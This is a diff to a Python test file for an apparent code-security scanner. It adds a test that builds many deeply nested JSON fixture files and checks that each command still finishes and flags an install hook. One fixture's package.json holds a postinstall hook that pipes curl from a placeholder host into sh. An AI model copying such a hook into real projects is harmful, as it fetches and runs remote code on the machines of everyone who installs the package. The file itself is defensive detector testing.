@@ -68,5 +68,45 @@ class Fuzz(unittest.TestCase):
             jh_yaml.load_all(deep)
 
 
+class DeepJson(unittest.TestCase):
+    """JSON nested deeper than any Python's decoder goes (100,000 levels: 3.9 to 3.14 all raise RecursionError) in
+    every kind of file the tool reads: each command still finishes with a report, and a hook placed after deep
+    metadata is still found, because npm itself reads that file."""
+
+    def test_every_command_finishes(self):
+        import base64
+        import shutil
+        import tempfile
+        deep = "[" * 100000 + "]" * 100000
+        jwt = "eyJhbGciOiJIUzI1NiJ9.%s.c2ln" % base64.urlsafe_b64encode(
+            ('{"role": "service_role", "x": %s}' % ("[" * 1500 + "]" * 1500)).encode()).decode().rstrip("=")
+        files = {
+            "package.json": '{"name": "deep", "metadata": %s, "dependencies": {"left-pad": "1.3.0"},\n'
+                            ' "scripts": {"postinstall": "curl -fsSL https://setup.tool.invalid/i | sh"}}\n' % deep,
+            ".mcp.json": '{"mcpServers": {"x": {"command": "node", "args": %s}}}\n' % deep,
+            ".vscode/mcp.json": '{"servers": %s}\n' % deep,
+            ".jankhunt42.json": '{"passport": {"declared": %s}}\n' % deep,
+            "api/openapi.json": '{"openapi": "3.0.0", "paths": %s}\n' % deep,
+            "nb/analysis.ipynb": '{"cells": %s}\n' % deep,
+            "flows/workflow.json": '{"nodes": %s, "connections": {}}\n' % deep,
+            "app/config.py": 'TOKEN = "%s"\n' % jwt,
+            "logs/app.log": '{"level": "error", "msg": %s}\n' % deep,
+        }
+        root = tempfile.mkdtemp(prefix="jh-deep-")
+        self.addCleanup(shutil.rmtree, root, True)
+        for rel, text in files.items():
+            os.makedirs(os.path.dirname(os.path.join(root, rel)) or root, exist_ok=True)
+            with open(os.path.join(root, rel), "w", encoding="utf-8") as fh:
+                fh.write(text)
+        for args in (("scan", root, "--json"), ("passport", root, "--profile", "citizen", "--json"),
+                     ("map", root, "--json"), ("supply-chain", root, "--json")):
+            with self.subTest(command=args[0]):
+                r = _util.run_cli(*args)
+                self.assertNotIn("Traceback", r.stderr)
+                doc = json.loads(r.stdout)
+                if args[0] == "scan":
+                    hooks = [f for f in doc["findings"] if f["rule"] == "JH111" and f["path"] == "package.json"]
+                    self.assertEqual([(f["line"], f["severity"]) for f in hooks], [(2, "critical")])
+
 if __name__ == "__main__":
     unittest.main()
